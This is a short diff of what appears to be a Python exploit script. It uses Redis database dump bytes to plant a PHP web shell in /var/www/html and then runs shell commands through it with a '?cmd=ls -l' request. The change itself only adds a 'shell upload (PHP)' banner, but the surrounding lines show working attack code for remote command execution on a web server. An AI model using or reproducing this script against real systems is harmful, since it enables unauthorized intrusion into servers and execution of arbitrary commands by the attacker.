@@ -5,7 +5,7 @@ header = b'REDIS0006\xfe\x00\x00\x06'
 trailer = b'\n\xff\xe7\x1fa\x10\x9bm\tB'
 # Ajust this variable to the path where to dump data on you machine
 path = '../'
-
+print('\n>>>>>shell upload (PHP)<<<<<\n')
 import requests
 headers = {}
 php_dir = '/var/www/html'
@@ -39,6 +39,7 @@ for c in commands:
         response = response[start:end]
         print (f'{response}')
 # Test the whole thing
+
 response = requests.get (f'{url}{php_file}?cmd=ls -l')
 print (response.content[len (header) + len (redis_key) + 2:-len (trailer)].decode ('utf-8'))
 
